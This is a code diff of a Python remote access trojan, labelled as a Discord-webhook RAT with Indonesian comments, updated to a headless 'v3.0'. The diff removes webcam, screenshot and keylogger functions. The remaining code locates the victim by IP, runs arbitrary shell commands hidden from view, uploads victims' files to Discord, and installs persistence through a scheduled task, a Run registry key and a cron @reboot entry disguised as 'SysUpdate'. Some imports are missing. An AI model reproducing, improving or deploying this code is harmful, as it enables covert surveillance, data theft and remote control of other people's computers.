@@ -1,8 +1,8 @@
 """
-RAT DISCORD WEBHOOK v2.0 - HEADLESS MODE
-Fix untuk Linux/Cloud (no DISPLAY/X11)
-GPS + Screenshot + Shell + Persistence
-TANPA BOT - Webhook only
+RAT DISCORD WEBHOOK v3.0 - ULTRA LIGHTWEIGHT
+NO cv2, NO pyautogui, NO DISPLAY needed!
+GPS + Shell + Persistence + File Upload
+100% compatible Codespace/Cloud/Headless
 """
 
 import requests
@@ -11,20 +11,9 @@ import platform
 import os
 import subprocess
 import time
-import cv2
-from pynput import keyboard
-import threading
-import base64
 import json
 import io
-
-# HEADLESS SCREENSHOT FIX
-HAS_DISPLAY = 'DISPLAY' in os.environ
-try:
-    import PIL.ImageGrab
-    PIL_AVAILABLE = True
-except:
-    PIL_AVAILABLE = False
+import base64
 
 # ═══════════════════════════════════════════════════════════════
 WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
@@ -35,182 +24,182 @@ commands = []
 last_commands = []
 
 def send_webhook(title, content="", file=None):
-    """Kirim ke Discord"""
+    """Kirim ke Discord Webhook"""
     try:
         data = {"embeds": [{"title": title, "description": content, "color": 0xff4444}]}
         if file:
-            files = {"file": ("capture.png", file, "image/png")}
+            files = {"file": file}
             requests.post(webhook, data=data, files=files, timeout=10)
         else:
             requests.post(webhook, json=data, timeout=10)
+        return True
     except:
-        pass
+        return False
 
 def get_sysinfo():
-    """GPS + System Info"""
+    """GPS Tracking + System Info"""
     try:
-        ip = requests.get('https://api.ipify.org?format=json', timeout=5).json()['ip']
-        geo = requests.get(f'http://ipinfo.io/{ip}/json', timeout=5).json()
+        # Public IP
+        ip_resp = requests.get('https://api.ipify.org?format=json', timeout=5)
+        public_ip = ip_resp.json()['ip']
+        
+        # GPS dari ipinfo.io
+        geo_resp = requests.get(f'http://ipinfo.io/{public_ip}/json', timeout=5)
+        geo = geo_resp.json()
         
         loc = geo.get('loc', '0.0,0.0').split(',')
-        lat, lon = float(loc[0]), float(loc[1]) if len(loc) > 1 else 0.0
+        lat = float(loc[0]) if loc else 0.0
+        lon = float(loc[1]) if len(loc) > 1 else 0.0
         
-        info = f"""**📍 GPS TRACKING**
-`IP:` {ip}
-`City:` {geo.get('city', '?')} - {geo.get('country', '?')}
-`ISP:` {geo.get('org', '?')}
-**LAT:** `{lat:.6f}` **LON:** `{lon:.6f}`
-🗺️ https://maps.google.com/?q={lat:.6f},{lon:.6f}
+        # System stats
+        ram = psutil.virtual_memory().percent
+        disk = psutil.disk_usage('/').percent if platform.system() != "Windows" else psutil.disk_usage('C:\\').percent
+        
+        info = f"""**📍 GPS LOCATION**
+        IP: {public_ip} City: {geo.get('city', 'Unknown')} Country: {geo.get('country', '??')} ISP: {geo.get('org', 'Unknown')}
 
-**💻 SYSTEM**
-`Host:` {platform.node()}
-`OS:` {platform.system()} {platform.release()}
-`CPU:` {platform.processor()}
-`RAM:` {psutil.virtual_memory().percent:.1f}% | `Disk:` {psutil.disk_usage('/').percent:.1f}%"""
+📍 LATITUDE: {lat:.6f} 📍 LONGITUDE: {lon:.6f} 🗺️ https://maps.google.com/?q={lat:.6f},{lon:.6f}
+
+💻 SYSTEM INFO Hostname: {platform.node()} OS: {platform.system()} {platform.release()} RAM: {ram:.1f}% | Disk: {disk:.1f}%
+
+🕐 Uptime: {time.strftime('%H:%M:%S', time.gmtime(psutil.boot_time() - time.time()))}
+**Processes:** {len(psutil.pids())} | **CPU:** {psutil.cpu_percent():.1f}%"""
         return info
     except Exception as e:
-        return f"❌ GPS: {str(e)}"
-
-def take_screenshot():
-    """Screenshot - Handle headless"""
-    try:
-        if HAS_DISPLAY and PIL_AVAILABLE:
-            img = PIL.ImageGrab.grab()
-        else:
-            # Fallback: text screenshot info
-            return None
-        
-        buffer = io.BytesIO()
-        img.save(buffer, 'PNG')
-        buffer.seek(0)
-        return buffer
-    except:
-        return None
+        return f"❌ GPS Error: {str(e)}"
 
 def exec_shell(cmd):
-    """Shell command"""
+    """Execute shell command"""
     try:
         if platform.system() == "Windows":
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20, creationflags=0x08000000)
+            result = subprocess.run(cmd, shell=True, capture_output=True, 
+                                  text=True, timeout=25, 
+                                  creationflags=subprocess.CREATE_NO_WINDOW)
         else:
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
-        out = result.stdout or result.stderr or "No output"
-        return f"```{out[:1800]}```"
-    except:
-        return "❌ Shell failed"
+            result = subprocess.run(cmd, shell=True, capture_output=True, 
+                                  text=True, timeout=25)
+        
+        output = result.stdout.strip()
+        error = result.stderr.strip()
+        
+        if output:
+            return f"**✅ OUTPUT:**\n```{output[:1900]}```"
+        elif error:
+            return f"**❌ ERROR:**\n```{error[:1900]}```"
+        else:
+            return "**📭 No output**"
+    except subprocess.TimeoutExpired:
+        return "**⏰ Timeout (25s)**"
+    except Exception as e:
+        return f"**❌ Failed:** {str(e)}"
 
-def webcam_snap():
-    """Webcam"""
+def upload_file(filename):
+    """Upload file"""
     try:
-        cap = cv2.VideoCapture(0)
-        ret, frame = cap.read()
-        if ret:
-            cv2.imwrite('webcam.jpg', frame)
-            with open('webcam.jpg', 'rb') as f:
-                send_webhook("📸 WEBCAM", file=f)
-            os.remove('webcam.jpg')
-            cap.release()
-            return True
-        cap.release()
-        return False
-    except:
-        return False
-
-def keylogger(duration=20):
-    """Keylogger"""
-    keys = []
-    def callback(key):
-        try:
-            keys.append(str(key.char))
-        except:
-            keys.append(f"[{key.name}]")
-    
-    try:
-        with keyboard.Listener(on_press=callback) as listener:
-            time.sleep(duration)
-        return ''.join(keys[-100:])
-    except:
-        return "❌ Keylogger failed"
+        if os.path.exists(filename):
+            size = os.path.getsize(filename)
+            if size > 8 * 1024 * 1020:  # 8MB Discord limit
+                return "❌ File too big (>8MB)"
+            
+            with open(filename, 'rb') as f:
+                file_tuple = (os.path.basename(filename), f, 'application/octet-stream')
+                send_webhook("📤 FILE UPLOAD", f"**{filename}**\nSize: {size/1024:.1f}KB", file_tuple)
+            return f"✅ Uploaded {filename}"
+        return f"❌ {filename} not found"
+    except Exception as e:
+        return f"❌ Upload failed: {str(e)}"
 
 def add_persistence():
-    """Persistence"""
+    """Add startup persistence"""
     try:
         if platform.system() == "Windows":
-            subprocess.run('schtasks /create /sc onlogon /tn "UpdateSvc" /tr "python rat.py" /f', shell=True)
-            send_webhook("✅ Windows Scheduled Task")
+            # Scheduled Task
+            subprocess.run('schtasks /create /sc onlogon /tn "SysUpdate" /tr "python rat.py" /f /rl highest', 
+                          shell=True, capture_output=True)
+            # Registry startup
+            startup_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysUpdate /t REG_SZ /d "python rat.py" /f'
+            subprocess.run(startup_cmd, shell=True, capture_output=True)
+            return "✅ Windows: Task + Registry"
         else:
-            cron_job = f'@reboot cd {os.getcwd()} && python3 rat.py'
+            # Cron job
+            cron_job = f'@reboot cd {os.getcwd()} && nohup python3 rat.py &'
             subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -', shell=True)
-            send_webhook("✅ Linux Cron")
-    except:
-        send_webhook("❌ Persistence failed")
+            return "✅ Linux: Cron @reboot"
+    except Exception as e:
+        return f"❌ Persistence: {str(e)}"
 
 def poll_commands():
-    """Cek commands.txt"""
+    """Check for new commands"""
     global commands
     try:
         if os.path.exists('commands.txt'):
             with open('commands.txt', 'r') as f:
-                commands = [line.strip() for line in f if line.strip()]
+                new_commands = [line.strip() for line in f.readlines() if line.strip()]
             os.remove('commands.txt')
+            
+            # Merge without duplicates
+            for cmd in new_commands:
+                if cmd not in commands:
+                    commands.append(cmd)
+            print(f"📨 New commands: {len(new_commands)}")
     except:
         pass
 
-def main_loop():
-    """RAT Main Loop"""
-    print("🚀 RAT Webhook HEADLESS starting...")
+def heartbeat():
+    """Periodic status update"""
+    while True:
+        try:
+            info = get_sysinfo()
+            send_webhook("🔄 HEARTBEAT", info)
+            time.sleep(1800)  # 30 minutes
+        except:
+            time.sleep(300)
+
+if __name__ == "__main__":
+    print("🚀 ULTRA LIGHT RAT starting...")
+    print(f"📍 Target: {platform.node()}")
+    
+    # Start heartbeat thread
+    threading.Thread(target=heartbeat, daemon=True).start()
+    
+    # Initial report
     send_webhook("🚀 RAT ONLINE", get_sysinfo())
     
+    last_commands = []
     while True:
         try:
             poll_commands()
             
-            for cmd in commands[:]:  # Copy list
+            # Process commands
+            for cmd in commands[:]:
                 if cmd not in last_commands:
                     last_commands.append(cmd)
-                    print(f"📨 Executing: {cmd}")
+                    print(f"🔧 Running: {cmd}")
                     
-                    if cmd == "screenshot":
-                        img = take_screenshot()
-                        if img:
-                            send_webhook("📸 SCREENSHOT", file=img)
-                        else:
-                            send_webhook("📱 SCREEN INFO", "Headless mode - no display")
-                            
-                    elif cmd == "webcam":
-                        webcam_snap()
+                    if cmd == "sysinfo":
+                        send_webhook("📊 SYSINFO", get_sysinfo())
+                        
+                    elif cmd == "persist":
+                        result = add_persistence()
+                        send_webhook("🔄 PERSISTENCE", result)
                         
                     elif cmd.startswith("shell:"):
                         result = exec_shell(cmd[6:])
-                        send_webhook("💻 SHELL", result)
-                        
-                    elif cmd.startswith("keylog:"):
-                        duration = int(cmd[7:]) if cmd[7:].isdigit() else 20
-                        keys = keylogger(duration)
-                        send_webhook("⌨️ KEYLOG", f"```{keys}```")
-                        
-                    elif cmd == "persist":
-                        add_persistence()
+                        send_webhook("💻 SHELL EXEC", result)
                         
                     elif cmd.startswith("upload:"):
-                        filename = cmd[7:]
-                        if os.path.exists(filename):
-                            size = os.path.getsize(filename) / 1024
-                            with open(filename, 'rb') as f:
-                                send_webhook("📤 UPLOAD", f"**{filename}** ({size:.1f}KB)", file=f)
+                        result = upload_file(cmd[7:])
+                        send_webhook("📤 UPLOAD", result)
+                        
+                    elif cmd == "processes":
+                        procs = "\n".join([p.info['name'][:20] for p in psutil.process_iter(['name'])][:15])
+                        send_webhook("⚙️ TOP PROCESSES", f"```{procs}```")
             
-            # Periodic GPS update
-            if int(time.time()) % 1800 == 0:  # 30 menit
-                send_webhook("📍 GPS UPDATE", get_sysinfo())
-                
             time.sleep(POLL_INTERVAL)
             
         except KeyboardInterrupt:
             send_webhook("🔴 RAT OFFLINE")
             break
         except Exception as e:
-            print(f"Error: {e}")
+            print(f"⚠️ Error: {e}")
             time.sleep(10)
-
-if __name__ == "__main__":
-    main_loop()
